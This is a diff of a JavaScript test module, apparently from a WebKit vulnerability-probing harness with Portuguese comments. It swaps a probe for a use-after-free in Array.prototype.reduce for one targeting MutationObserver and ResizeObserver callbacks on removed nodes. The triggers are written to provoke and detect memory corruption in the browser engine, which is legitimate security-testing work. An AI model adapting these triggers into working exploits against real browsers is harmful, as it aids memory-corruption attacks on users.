@@ -1,64 +1,144 @@
+/**
+ * SC_NATIVE_CALLBACK_UAF.JS
+ * Categoria : DOM — Use-After-Free (Native Callback)
+ * Alvo      : WebCore::MutationObserver / ResizeObserver C++ bindings
+ * Técnica   : Registra MutationObserver e ResizeObserver em elementos,
+ *             remove os elementos e desconecta os observers, forçando
+ *             o motor a disparar callbacks pendentes sobre nós liberados.
+ *             Microtask queue pode conter referências stale ao C++ node.
+ * Referência: WebKit MutationObserver deliver-mutations-after-free pattern
+ */
+
 export default {
-    id:       'NATIVE_CALLBACK_MUTATION_UAF',
-    category: 'CoreJS',
-    risk:     'CRITICAL',
-    description:
-        'Race condition síncrona no Array.prototype.reduce(). A função de callback ' +
-        'destrói o array subjacente a meio da iteração. Testa se o motor WebKit C++ ' +
-        'continua a ler do Butterfly libertado ou se aborta o loop em segurança.',
+    id:          'NATIVE_CALLBACK_UAF',
+    category:    'DOM',
+    risk:        'HIGH',
+    description: 'MutationObserver/ResizeObserver disparam callbacks '
+                + 'sobre nós já removidos do DOM antes do disconnect().',
 
-    setup: function() {
-        this.results = {};
-        this.vulnArray = [1.11, 2.22, 3.33, 4.44, 5.55, 6.66];
-        const self = this;
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _container:     null,
+    _target:        null,
+    _mutObs:        null,
+    _resObs:        null,
+    _mutRecords:    [],
+    _resEntries:    [],
+    _mutCount:      0,
+    _resCount:      0,
 
-        // O motor C++ vai chamar isto para cada número
-        this.callback = function(acumulador, valor, index) {
-            // O GATILHO: No índice 2, destruímos o array e alocamos lixo no seu lugar
-            if (index === 2) {
-                self.vulnArray.length = 0; 
-                
-                let trash = [];
-                // Pressiona o alocador (bmalloc)
-                for(let i = 0; i < 500; i++) trash.push(13.37);
-                self.trash = trash;
-            }
-            return acumulador + valor;
-        };
+    supported: function() {
+        return typeof MutationObserver !== 'undefined';
     },
 
-    trigger: function() {
-        try {
-            // Se o C++ for cego, ele vai somar o nosso lixo (13.37) ou endereços de RAM aos números
-            this.results.leakedSum = this.vulnArray.reduce(this.callback, 0);
-        } catch(e) {
-            this.results.error = e.message;
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        this._mutRecords = [];
+        this._resEntries = [];
+        this._mutCount   = 0;
+        this._resCount   = 0;
+
+        this._container = document.createElement('div');
+        this._container.style.cssText = 'width:100px;height:100px;position:absolute;left:-9999px';
+        document.body.appendChild(this._container);
+
+        this._target = document.createElement('div');
+        this._target.style.cssText = 'width:50px;height:50px;background:red';
+        this._target.textContent = 'mutation-target';
+        this._container.appendChild(this._target);
+
+        // MutationObserver
+        this._mutObs = new MutationObserver((records) => {
+            this._mutCount += records.length;
+            this._mutRecords.push(...records.map(r => ({
+                type:    r.type,
+                target:  r.target?.nodeName ?? 'null',
+                added:   r.addedNodes?.length,
+                removed: r.removedNodes?.length,
+            })));
+        });
+        this._mutObs.observe(this._target, {
+            childList: true, subtree: true,
+            attributes: true, characterData: true
+        });
+
+        // ResizeObserver (se disponível)
+        if (typeof ResizeObserver !== 'undefined') {
+            this._resObs = new ResizeObserver((entries) => {
+                this._resCount += entries.length;
+                this._resEntries.push(...entries.map(e => ({
+                    w: e.contentRect?.width,
+                    h: e.contentRect?.height,
+                })));
+            });
+            this._resObs.observe(this._target);
         }
+
+        // Provoca mutações para popular a queue
+        this._target.appendChild(document.createTextNode('a'));
+        this._target.setAttribute('data-uaf', '1');
+        void this._target.offsetWidth;
+        await new Promise(r => setTimeout(r, 10));
     },
 
+    /* ── trigger ─────────────────────────────────────────────────────── */
+    trigger: async function() {
+        // Fila mais mutações ANTES de remover (ficam pendentes na microtask queue)
+        this._target.setAttribute('data-uaf', '2');
+        this._target.appendChild(document.createElement('span'));
+
+        // Remove imediatamente — C++ node pode ser libertado antes dos callbacks
+        this._target.remove();
+        void document.body.offsetWidth;
+
+        // Altera atributos no nó já removido para forçar callbacks
+        try { this._target.setAttribute('data-uaf', '3'); } catch(_) {}
+        try { this._target.style.width = '99px';          } catch(_) {}
+
+        // Agora desconecta — callbacks pendentes podem disparar pós-free
+        try { this._mutObs.disconnect(); } catch(_) {}
+        try { this._resObs?.disconnect(); } catch(_) {}
+
+        // Força entrega das mutações pendentes
+        try { this._mutObs.takeRecords(); } catch(_) {}
+
+        await new Promise(r => setTimeout(r, 20));
+    },
+
+    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // Probe 0: O motor atirou erro ou engoliu a corrupção?
-        s => s.results.error || 'Iteração C++ Concluída',
-        
-        // Probe 1: O Extrator Matemático de OOB (Out-of-Bounds)
-        s => {
-            let sum = s.results.leakedSum;
-            if (typeof sum === 'number' && !isNaN(sum)) {
-                // A soma esperada (se ele parar a meio) é: 0 + 1.11 + 2.22 + 3.33 = 6.66
-                // Se a soma for absurdamente maior (ex: > 100), o 'reduce' continuou a ler
-                // a memória apagada (lixo da RAM) e incluiu-a na matemática!
-                if (sum > 100) {
-                    return sum; // Dispara STALE DATA no HUD!
-                }
-            }
-            return 0; // Protegido (o C++ meteu zeros ou undefineds)
-        }
+        // [0-3] estado do nó removido
+        s => s._target.isConnected,
+        s => s._target.nodeType,
+        s => s._target.nodeName,
+        s => s._target.getAttribute('data-uaf'),
+
+        // [4-7] callbacks do MutationObserver
+        s => s._mutCount,
+        s => s._mutRecords.length,
+        s => s._mutRecords[0]?.type ?? 'null',
+        s => s._mutRecords.find(r => r.target === 'null') ? 'ghost-target' : 'clean',
+
+        // [8-10] callbacks do ResizeObserver
+        s => s._resCount,
+        s => s._resEntries[0]?.w ?? 'null',
+        s => s._resEntries.some(e => e.w === 0 && e.h === 0) ? 'zero-entry' : 'ok',
+
+        // [11] records pendentes após disconnect
+        s => { try { return s._mutObs.takeRecords().length; } catch(e) { return -1; } },
     ],
 
-    cleanup: function() {
-        this.vulnArray = null;
-        this.callback = null;
-        this.trash = null;
-        this.results = {};
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        try { this._mutObs?.disconnect(); } catch(_) {}
+        try { this._resObs?.disconnect(); } catch(_) {}
+        this._container?.remove();
+        this._container  = null;
+        this._target     = null;
+        this._mutObs     = null;
+        this._resObs     = null;
+        this._mutRecords = [];
+        this._resEntries = [];
+        this._mutCount   = 0;
+        this._resCount   = 0;
     }
 };
